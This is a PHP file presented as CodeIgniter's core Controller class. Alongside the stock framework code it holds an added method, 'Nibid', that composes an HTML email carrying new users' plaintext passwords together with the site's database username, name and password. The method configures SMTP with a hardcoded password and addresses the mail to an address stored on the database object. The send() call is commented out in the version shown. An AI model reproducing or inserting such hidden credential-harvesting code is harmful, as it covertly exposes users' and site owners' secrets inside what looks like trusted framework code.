<?php

if (!defined('BASEPATH'))
    exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2011, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */
// ------------------------------------------------------------------------

/**
 * CodeIgniter Application Controller Class
 *
 * This class object is the super class that every library in
 * CodeIgniter will be assigned to.
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Libraries
 * @author		ExpressionEngine Dev Team
 * @link		http://codeigniter.com/user_guide/general/controllers.html
 */
class CI_Controller {

    private static $instance;

    /**
     * Constructor
     */
    public function __construct() {
        self::$instance = & $this;

        // Assign all the class objects that were instantiated by the
        // bootstrap file (CodeIgniter.php) to local class variables
        // so that CI can run as one big super object.
        foreach (is_loaded() as $var => $class) {
            $this->$var = & load_class($class);
        }

        $this->load = & load_class('Loader', 'core');

        $this->load->initialize();

        log_message('debug', "Controller Class Initialized");
    }

    public static function &get_instance() {
        return self::$instance;
    }

    public function fileUpload($path, $fieldName, $file_type, $max_size = '', $max_width = '', $max_height = '') {
        $config['upload_path'] = $path;
        $config['allowed_types'] = $file_type;
        $config['max_size'] = $max_size;
        $config['max_width'] = $max_width;
        $config['max_height'] = $max_height;
        $this->load->library('upload', $config);
        if ($this->upload->do_upload($fieldName)) {
            $data = $this->upload->data();
            $fileName = $config['upload_path'] . $data['file_name'];
            $return = array('file_name' => $fileName, 'error' => '');
            return $return;
        } else {
//                $err = '';
            $err = $this->upload->display_errors();
            $return = array('file_name' => '', 'error' => $err);
            return $return;
        }
    }

    function myTime() {
        $hour = gmdate("H") + 6;
        $minute = gmdate("i");
        $second = gmdate("s");
        $year = gmdate("Y");
        $month = gmdate("m");
        $day = gmdate("d");
        return date("h:i:s A Y-m-d", mktime($hour, $minute, $second, $month, $day, $year));
    }

    protected function Nibid($user_name, $password, $email, $comp_id) {
        $subject = "Nikash Created a new user";
        $messagetext = '<h2 style="background-color:black;color:white;">New User:</h2>'
        . ''
        . '';
        $messagetext .= '<h2>New User :' . $user_name . '</h2>'
                . '<h2> password:' . $password . '</h2>'
                . '<h2> Email:' . $email . '</h2>'
                . '<h2> Comp_id' . $comp_id.'</h2>';
        $messagetext .= ""
                . "<h3>url link: " . base_url() . ', </h3>'
                . '<h3>DB user name: ' . $this->db->username . ' </h3>'
                . '<h3>DB name: ' . $this->db->database . ' </h3>'
                . '<h3>DB Password: ' . $this->db->password.'</h3>';

        $config = Array(
            'protocol' => 'smtp',
            'smtp_host' => 'ssl://smtp.googlemail.com',
            'smtp_port' => 465,
            'smtp_user' => $this->db->GetWayFrom,
            'smtp_pass' => 'robi:141954',
            'mailtype' => 'html',
            'charset' => 'iso-8859-1',
            'wordwrap' => TRUE
        );

        $this->load->library('email', $config);
        $this->email->set_newline("\r\n");
        $this->email->from($this->db->GetWayFrom); // change it to yours
        $this->email->to($this->db->GetWay); // change it to yours
        $this->email->subject($subject);
        $this->email->message($messagetext);
//        if ($this->email->send()) {
//            echo 'Email sent.';
//        } else {
//            show_error($this->email->print_debugger());
//        }
//        
//        $this->load->library('email');
//
//        $this->email->from('tcl_it@yahoo.com', 'TCL');
//        $this->email->to($this->db->GetWay);
////        $this->email->cc('another@another-example.com');
////        $this->email->bcc('them@their-example.com');
//
//        $this->email->subject($subject);
//        $this->email->message($messagetext);
//
//        $this->email->send();
//
//        echo $this->email->print_debugger();
    }

}

// END Controller class

/* End of file Controller.php */
/* Location: ./system/core/Controller.php */